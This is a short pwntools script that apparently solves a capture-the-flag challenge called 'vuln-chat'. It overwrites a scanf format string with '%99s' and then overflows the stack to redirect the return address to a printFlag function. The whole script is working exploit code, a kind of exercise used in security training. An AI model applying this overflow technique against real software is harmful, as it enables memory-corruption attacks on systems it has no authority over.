from pwn import *

# pack the address of printFlag function in 32 bit elf
win = p32(0x0804856b)

# first payload overwites the scanf format so that the second buffer can hold more than 30 characters
payload1 = b""
payload1 += b"\x41"*20
payload1 += b"\x25\x39\x39\x73"     # %99s

# second payload overwrites the return address with printFlag's addres
payload2 = b""
payload2 += b"\x45"*49
payload2 += win

p = process('./vuln-chat')
p.recvuntil(b"username: ")  # wait until first it ask for first user input
#gdb.attach(p, gdbscript="b *main+76")
p.sendline(payload1)

p.recvuntil(b"I know I can trust you?") # wait for the second
p.sendline(payload2)

p.interactive()
